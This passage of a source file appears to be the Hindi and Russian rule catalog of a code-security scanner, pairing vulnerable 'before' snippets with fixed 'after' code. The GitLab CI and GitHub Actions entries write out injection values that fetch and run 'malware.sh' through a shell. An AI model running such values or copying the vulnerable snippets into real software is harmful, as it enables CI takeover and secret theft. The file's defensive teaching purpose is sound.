    title: original.title.replace("Dipendenza vulnerabile:", "कमज़ोर डिपेंडेंसी:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "अभी तक कोई ठीक किया गया वर्शन मालूम नहीं है — कोई वैकल्पिक पैकेज इस्तेमाल करने पर विचार करें, या प्रोजेक्ट के अपडेट पर नज़र रखें।"
      ),
    },
  }),
  "docker-unpinned-base-image": {
    title: 'Dockerfile की बेस इमेज ":latest" टैग इस्तेमाल करती है',
    description:
      'एक FROM इंस्ट्रक्शन किसी सटीक वर्शन के बजाय साफ़ तौर पर ":latest" टैग इस्तेमाल करता है। "latest" समय के साथ बदलता रहता है: वही बिल्ड, किसी दूसरे समय पर दोबारा बनाई जाए, तो बेस इमेज का अलग वर्शन मिल सकता है — एक ऐसा बिल्ड जो दोहराया नहीं जा सकता, और कोई अनचाहा अपडेट बिना किसी के तय किए ही आ सकता है।',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile COPY के बजाय ADD से कोई रिमोट फ़ाइल डाउनलोड करती है",
    description:
      "http/https URL वाला एक ADD इंस्ट्रक्शन बिल्ड के दौरान इंटरनेट से एक फ़ाइल डाउनलोड करता है, बिना किसी इंटीग्रिटी जाँच के और कंटेंट रिपॉज़िटरी में दिखे बिना। अगर वह URL कभी हैक हो जाए, तो बिल्ड मनमाना कंटेंट खींच लेता है, और सिर्फ़ Dockerfile पढ़ने भर से किसी को पता भी नहीं चलता।",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<अपेक्षित hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'GitLab CI पाइपलाइन में एक बाहरी उपयोगकर्ता द्वारा नियंत्रित वैल्यू दूसरी शेल से गुज़रती है',
      description: 'एक "script:" लाइन (या "before_script:"/"after_script:") "eval" या "sh -c"/"bash -c" का उपयोग किसी GitLab प्रीडिफ़ाइंड वेरिएबल जैसे मर्ज रिक्वेस्ट टाइटल, कमिट मैसेज या ब्रांच नाम के साथ करती है — ये सभी कोई भी मर्ज रिक्वेस्ट खोलकर लिख सकता है, यहां तक कि बाहरी फोर्क से भी। वैल्यू पहले बाहरी शेल द्वारा एक्सपैंड होती है, फिर एक ऐसी स्ट्रिंग में चिपका दी जाती है जिसे दूसरी शेल फिर से कोड के रूप में पढ़ती है: "$(curl malware.sh | sh)" जैसा टाइटल पाइपलाइन में मनमाने कमांड चला देगा, उस जॉब में उपलब्ध सभी सीक्रेट्स तक पहुंच के साथ।',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # कमांड को आर्गुमेंट के रूप में दिया गया, कभी भी "bash -c" स्ट्रिंग के अंदर नहीं जो इसे फिर से पढ़ ले`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'GitLab CI पाइपलाइन में Docker-in-Docker TLS एन्क्रिप्शन बंद करके चल रहा है',
      description: 'जॉब "docker:dind" सर्विस (Docker-in-Docker, पाइपलाइन के अंदर इमेज बनाने के लिए ज़रूरी) का उपयोग करता है लेकिन "DOCKER_TLS_CERTDIR" को खाली स्ट्रिंग पर सेट करता है, जिससे Docker क्लाइंट और dind डीमन के बीच TLS एन्क्रिप्शन पूरी तरह बंद हो जाता है। TLS के बिना, runner के उसी इंटरनल नेटवर्क पर उस पोर्ट तक पहुंचने वाला कोई भी व्यक्ति — उस जॉब तक सीमित रहने के बजाय — विस्तारित विशेषाधिकारों वाले Docker डीमन को नियंत्रित कर सकता है।',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # Docker क्लाइंट और dind डीमन के बीच TLS चालू रहता है — "" इसे पूरी तरह बंद कर देता है`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CI पाइपलाइन की Docker इमेज किसी निश्चित वर्शन पर फिक्स नहीं है',
      description: 'पाइपलाइन का "image:" बिना टैग वाली इमेज (जो ":latest" के बराबर है) या सीधे ":latest" की ओर इशारा करता है। उस इमेज को मेंटेन करने वाला कभी भी इसकी सामग्री बदल सकता है बिना रिपॉज़िटरी बदले — वही पाइपलाइन एक दिन से दूसरे दिन अलग कोड चलाना शुरू कर सकती है, जो कमिट के बजाय टैग से रेफ़र की गई GitHub Action जैसा ही सप्लाई चेन जोखिम है।',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # "latest" के बजाय एक निश्चित टैग (या इससे भी बेहतर एक डाइजेस्ट "node@sha256:...")`,
      },
    },
},
  ru: {
  "supabase-service-role-in-client": {
    title: "Секретный ключ Supabase попадает в файл, доступный браузеру",
    description:
      "Переменная с публичным префиксом (например, NEXT_PUBLIC_, VITE_) или файл на стороне клиента ссылается на service role key Supabase. Этот ключ обходит Row Level Security: если он попадает в бандл браузера, кто угодно может прочитать его и действовать как администратор базы данных.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (только сервер)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "В коде напрямую записаны пароли или секретные ключи",
    description:
      "Ключ API, токен или пароль записаны как буквальное значение вместо чтения из переменной окружения. Любой, кто прочитает исходный код (или репозиторий, если он публичный), получает этот секрет.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Среди анализируемых файлов есть файл с настоящими паролями проекта",
    description:
      "В анализ включён файл .env с реальными значениями (не .env.example). Если этот файл попадёт в репозиторий или в публичный деплой, все содержащиеся в нём учётные данные окажутся раскрыты.",
    fix: {
      before: `# .env (закоммичен по ошибке)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (закоммичен)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env остаётся вне репозитория (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Любой может читать или изменять данные всех пользователей",
    description:
      "Row Level Security отключена, либо политика разрешает доступ кому угодно (USING (true)) без проверки, кто делает запрос. Любой аутентифицированный пользователь — или даже анонимный — может читать или изменять данные всех остальных.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Значение, введённое пользователем, вставляется напрямую в запрос к базе данных",
    description:
      "SQL-запрос строится через конкатенацию или прямую интерполяцию строки вместо использования параметров. Если этот текст приходит (даже косвенно) от пользователя, он может изменить сам запрос — SQL-инъекция.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Похоже, пароли никак не защищены",
    description:
      "Поле пароля сохраняется в точности таким, каким пришло в запросе, и в файле не встречается ни одной функции хеширования (bcrypt, argon2, scrypt). Если база данных будет скомпрометирована, все пароли сразу же можно будет использовать.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Секрет, используемый для подписи входов в систему, записан в коде открытым текстом",
    description:
      "Секрет, передаваемый в jwt.sign / jwt.verify (или переменная JWT_SECRET), — это буквальное значение в коде вместо переменной окружения. Любой, кто его прочитает, сможет создавать валидные токены доступа для любого пользователя.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Сервер можно заставить выполнить внешние команды",
    description:
      "Функция, выполняющая системные команды (exec, execSync, spawn), получает строку, построенную через интерполяцию или конкатенацию. Если часть этой строки приходит из пользовательского ввода, тот, кто её контролирует, может заставить сервер выполнить произвольные команды.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Файл на сервере можно прочитать или записать, выбрав путь извне",
    description:
      'Функция, которая читает, записывает или отправляет файл, получает путь напрямую из значения запроса (query, body, params) без проверки, что он остаётся внутри разрешённой папки. Злоумышленник может вставить "../", чтобы выйти за пределы предполагаемой папки и прочитать или перезаписать произвольные файлы на сервере (например, конфигурационный файл с учётными данными).',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Путь не разрешён")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Значение, введённое пользователем, выполняется как код внутри запроса MongoDB",
    description:
      "Оператор $where в MongoDB выполняет JavaScript на стороне сервера для каждого документа — если эта строка строится через конкатенацию значения, пришедшего от пользователя, тот, кто его контролирует, может заставить выполниться произвольный код в контексте базы данных, а не просто изменить фильтр, как при обычной SQL-инъекции.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Значение, введённое пользователем, интерпретируется как шаблон, а не как данные",
    description:
      "Функция, которая компилирует/рендерит шаблон, получает ВЕСЬ шаблон из значения запроса, вместо того чтобы использовать фиксированный шаблон и передавать только данные. Злоумышленник может писать напрямую в синтаксисе шаблонизатора (например, {{7*7}} для Jinja2) и выполнять код на сервере — Server-Side Template Injection, которая часто приводит к выполнению произвольных команд, а не просто к проблеме отображения, как XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML-парсер можно заставить читать файлы или делать внешние запросы",
    description:
      "XML-парсер (DocumentBuilderFactory) создаётся без явного отключения внешних сущностей (DOCTYPE) в соседних строках. Если парсер получает XML из ненадёжного источника, злоумышленник может определить внешнюю сущность, чтобы прочитать файлы на сервере или заставить его обратиться по адресу на свой выбор — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Security group Terraform открывает чувствительный порт всему интернету",
    description:
      'Правило с "cidr_blocks", включающим 0.0.0.0/0 (любой IP-адрес), находится рядом с чувствительным портом — SSH (22), RDP (3389) или типичным портом базы данных (MySQL, Postgres, MongoDB, Redis, SQL Server). Кто угодно в интернете может попытаться подключиться к этому сервису, а не только те, кому следует.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # только ваша приватная сеть или bastion-хост\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Правило firewall Google Cloud открывает чувствительный порт всему интернету",
    description:
      'Ресурс "google_compute_firewall" с "source_ranges", включающим 0.0.0.0/0 (любой IP-адрес), разрешает трафик к чувствительному порту — SSH (22), RDP (3389) или типичному порту базы данных (MySQL, Postgres, MongoDB, Redis, SQL Server). Кто угодно в интернете может попытаться подключиться к этому сервису, а не только те, кому следует.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # только ваша приватная сеть или bastion-хост\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Сетевое правило Azure открывает чувствительный порт всему интернету",
    description:
      'Правило сетевой безопасности ("azurerm_network_security_rule", или блок "security_rule" внутри "azurerm_network_security_group") с "source_address_prefix" равным "*" или "0.0.0.0/0", направлением "Inbound" и доступом "Allow", находится рядом с чувствительным портом — SSH (22), RDP (3389) или типичным портом базы данных. Кто угодно в интернете может попытаться подключиться к этому сервису, а не только те, кому следует.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # только ваша приватная сеть или bastion-хост\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Секрет записан как значение по умолчанию переменной Terraform",
    description:
      'Переменная с именем вроде password/secret/token/key имеет буквальное значение в своём "default". В отличие от значения, передаваемого во время выполнения (tfvars, переменные окружения TF_VAR_*), значение по умолчанию попадает в исходный код — и если репозиторий общий или публичный, его увидит кто угодно, даже без доступа к состоянию Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # без значения по умолчанию: передавайте через файл .tfvars (вне git) или переменную окружения TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Значение, контролируемое внешним пользователем, напрямую попадает в shell-команду CI",
    description:
      'Команда "run:" в workflow GitHub Actions напрямую интерполирует значение вроде заголовка pull request, имени ветки или текста комментария — всё это может написать кто угодно, открывший pull request или комментарий, даже из внешнего форка. Значение вроде `"; curl malware.sh | sh #` выполнило бы произвольные команды в CI с доступом ко всем секретам, доступным в этом workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # передаётся как переменная окружения, никогда не интерполируется напрямую в команду`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflow выполняет код внешнего pull request с доступом к секретам репозитория",
    description:
      'Workflow использует "pull_request_target" — который выполняется с правами и секретами базового репозитория даже для pull request, открытого из постороннего форка — и делает checkout кода самого pull request ("github.event.pull_request.head"), а не базовой ветки. Тот, кто открывает pull request, фактически получает выполнение своего кода с доступом к этим секретам.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Делает checkout базовой ветки, а не кода PR — либо используйте\n      # "pull_request" вместо "pull_request_target", если более широкие\n      # права/секреты не нужны.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Данные запроса десериализуются в формате, который может выполнять код",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) или библиотека node-serialize (Node) десериализуют значение, взятое напрямую из запроса. В отличие от JSON, эти форматы могут представлять и выполнять код прямо во время десериализации — тот, кто контролирует отправленное значение, может добиться выполнения произвольного кода на сервере.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON никогда не выполняет код при разборе, в отличие от pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Код явно принимает неподписанные JWT-токены (алгоритм "none")',
    description:
      '"none" присутствует среди алгоритмов, принимаемых для проверки JWT-токена. У токена с алгоритмом "none" нет подписи для проверки: кто угодно может создать такой токен с любым содержимым (например, с ролью администратора), и код примет его как валидный.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // никогда не включайте "none" в число принимаемых алгоритмов`,
    },
  },
  "unprotected-new-table": {
    title: "Похоже, новая таблица создана без защиты",
    description:
      "SQL-миграция создаёт таблицу, но не включает Row Level Security для этой же таблицы в том же файле. Пока это так, таблица изначально не имеет никаких ограничений на то, кто может её читать или писать в неё.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Сайт принимает запросы от любого другого сайта",
    description:
      "Заголовок CORS настроен на приём запросов с любого источника (*), либо middleware cors() используется без ограничений. Любой сторонний сайт может вызывать ваши API из браузера уже аутентифицированного пользователя.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Функция с правами администратора не проверяет, кто её использует",
    description:
      "Маршрут или функция, чьё название намекает на административные операции, не содержит в соседних строках никакой проверки аутентификации или роли. Любой, кто знает URL, сможет её выполнить.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Сайт можно заставить выполнить внешний код",
    description:
      "Исходящий HTTP-запрос (fetch, axios) напрямую использует значение, пришедшее из запроса пользователя, в качестве целевого URL. Злоумышленник может заставить ваш сервер обращаться к внутренним или произвольным адресам — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL не разрешён")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Пароли защищены методом, который теперь легко взломать",
    description:
      "В той же строке к значению, связанному с паролем, применяется md5() или sha1(). Эти алгоритмы вычисляются слишком быстро: злоумышленник с базой данных может перебирать миллиарды паролей в секунду.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Контейнер в манифесте Kubernetes настроен на запуск от root",
    description:
      '"runAsUser: 0" или "runAsNonRoot: false" в securityContext явно принуждают контейнер выполняться от root. Если злоумышленнику удастся выполнить код внутри контейнера (например, через уязвимую библиотеку), root внутри контейнера облегчает возможный побег на хост или более широкое воздействие.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Контейнер в манифесте Kubernetes может получить больше привилегий, чем изначально",
    description:
      '"allowPrivilegeEscalation: true" в securityContext позволяет процессу внутри контейнера получить больше привилегий, чем у процесса, который его запустил (например, через бинарник с битом setuid). В сочетании с уязвимостью в приложении это ещё один шаг к выполнению кода с привилегиями, бóльшими, чем предполагалось.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Под в манифесте Kubernetes делит сеть, процессы или общую память хоста",
    description:
      '"hostNetwork", "hostPID" или "hostIPC", установленные в true, выводят под из его обычной изоляции: hostNetwork выставляет под в сеть хоста (в обход сетевых политик кластера), hostPID даёт ему видимость всех процессов на хост-машине, hostIPC даёт доступ к общей памяти хоста. Почти никогда не нужно для обычного приложения — типично только для низкоуровневых системных/мониторинговых инструментов.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access отключён на бакете S3, определённом в Terraform",
    description:
      'Одна или несколько из четырёх защит в "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) установлены в false. Это не значит, что бакет уже публичный, но это убирает защитную сетку, которая не дала бы случайно сделать его публичным в будущем.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "IAM-политика, определённая в Terraform, предоставляет полный доступ",
    description:
      'Statement с действием "*" и ресурсом "*" предоставляет полный доступ ко всем сервисам и ресурсам AWS — та же проверка, что уже выполняется для живого состояния IAM, только здесь она читается прямо из кода ещё до применения. Это может быть намеренно сделано для аварийной роли, но это стоит подтвердить: для повседневного использования предоставляйте только действительно необходимые права.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Бакет Google Cloud Storage сделан доступным для чтения кому угодно",
    description:
      'Ресурс "google_storage_bucket_iam_member" или "google_storage_bucket_iam_binding" предоставляет роль "allUsers" или "allAuthenticatedUsers" — первое делает бакет доступным для чтения кому угодно в интернете, даже без аккаунта Google; второе — любому, у кого есть любой аккаунт Google, а не только тем, кому следует иметь доступ.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # только те, кому действительно нужен доступ, не allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Публичный доступ к блобам включён на аккаунте хранилища Azure",
    description:
      '"allow_blob_public_access" установлен в true на "azurerm_storage_account": любой, кто знает URL блоба/контейнера, сделанного публичным, может его прочитать без какой-либо аутентификации.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Роль IAM Google Cloud предоставляет полный доступ (Owner/Editor)",
    description:
      '"google_project_iam_binding"/"google_project_iam_member" (или эквивалент на уровне организации/папки) назначает примитивную роль "roles/owner" или "roles/editor" — почти полный доступ ко всем сервисам проекта. Это может быть намеренно сделано для аварийного аккаунта, но это стоит подтвердить: для повседневного использования предоставляйте только более специфичные предопределённые роли, которые действительно нужны.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # только действительно нужная предопределённая роль, не roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Назначение роли Azure предоставляет полный доступ (Owner)",
    description:
      '"azurerm_role_assignment" назначает роль "Owner" — полный доступ, включая контроль над правами других пользователей, во всём назначенном scope (подписка, группа ресурсов...). Это может быть намеренно сделано для аварийного аккаунта, но это стоит подтвердить: для повседневного использования предоставляйте только более специфичную роль, которая действительно нужна (например, "Contributor" для одной группы ресурсов).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # только более специфичная роль, которая действительно нужна, не Owner на всю подписку\n}`,
    },
  },
  "weak-random-token": {
    title: "Токен безопасности сгенерирован генератором случайных чисел, не предназначенным для криптографии",
    description:
      "Значение с именем вроде token/session/reset/otp/csrf генерируется с помощью Math.random() (JS), random.random() (Python) или rand() (PHP) — генераторов, не предназначенных для безопасности, последовательности которых предсказуемы. Токен, сгенерированный таким образом, можно угадать или восстановить, что сводит на нет его предназначение (например, ссылку для сброса пароля, которую кто угодно сможет предугадать).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, не Math.random — непредсказуемо`,
    },
  },
  "ldap-injection": {
    title: "LDAP-фильтр строится путём прямой конкатенации значения из запроса",
    description:
      'Строка, которая строит LDAP-фильтр (например, "(uid=...)"), напрямую включает значение, взятое из запроса, без какого-либо экранирования специальных символов LDAP. Тот, кто контролирует это значение, может изменить логику фильтра — например, обойти проверку аутентификации или прочитать данные каталога, которые не должен видеть.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // специальные символы LDAP всегда нужно экранировать перед использованием в фильтре\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "Текст, написанный пользователями, может выполнить код в браузере",
    description:
      "Контент вставляется на страницу как необработанный HTML (dangerouslySetInnerHTML, v-html, .innerHTML) вместо обычного текста. Если этот контент включает пользовательский ввод, он может содержать скрипты, которые выполнятся в браузере того, кто читает страницу.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// или, если нужен HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Пространство для загруженных файлов видно кому угодно",
    description:
      "Bucket хранилища (Supabase Storage, S3) настроен как публичный. Если он содержит документы, фото или файлы, загруженные пользователями, любой, кто знает — или угадает — путь, может получить к ним доступ без аутентификации.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// отдавайте файлы через подписанные URL с ограниченным временем: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Одной ссылки достаточно, чтобы удалить или изменить данные",
    description:
      "Маршрут GET выполняет операцию, изменяющую данные (путь содержит delete/remove/update/edit). Запросы GET выполняются просто при переходе по ссылке или загрузке изображения с внешнего сайта — классическая зацепка для атаки CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Данные для входа, сохранённые в браузере, защищены плохо",
    description:
      "Токен доступа сохраняется в localStorage. В отличие от httpOnly cookie, любой скрипт, выполняющийся на странице (включая вредоносный, внедрённый через XSS), может его прочитать и украсть.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// установите токен как httpOnly cookie на сервере:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Сайт можно использовать для перенаправления на мошеннический сайт",
    description:
      "Сайт перенаправляет пользователя на адрес, взятый напрямую из запроса (query, body, params), без проверки, что это известный домен. Ссылка, которая выглядит так, будто ведёт на ваш сайт, на самом деле может вести на фишинговую страницу.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Изменив число в адресе, можно увидеть чужие данные",
    description:
      "Запрос к базе данных напрямую использует идентификатор, взятый из URL (req.params.id), без проверки в соседних строках, что он принадлежит пользователю, делающему запрос. Изменив id в адресе, можно получить доступ к данным другого пользователя — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Форма входа не блокирует слишком много попыток подряд",
    description:
      "Маршрут логина определён в файле, но в том же файле нет никаких следов middleware для ограничения частоты запросов. Без ограничения на попытки злоумышленник может перебирать пароли последовательно (brute force) без замедления.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Пароли или чувствительные данные попадают в логи",
    description:
      "Вызов console.log (или аналогичный) включает переменную с именем password, token, secret или apiKey. Если эти логи попадают во внешний сервис или файл, чувствительные данные остаются открытыми гораздо дольше, чем необходимо.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "header-injection": {
    title: "Значение запроса напрямую попадает в HTTP-заголовок ответа",
    description:
      "HTTP-заголовок ответа устанавливается значением, взятым напрямую из запроса (query, body, params), без проверки, что оно не содержит перевод строки (CRLF). Злоумышленник может вставить дополнительные заголовки или даже совершенно другой ответ — response splitting, что позволяет манипулировать кешем, cookie или контентом, показываемым другим пользователям.",
    fix: {
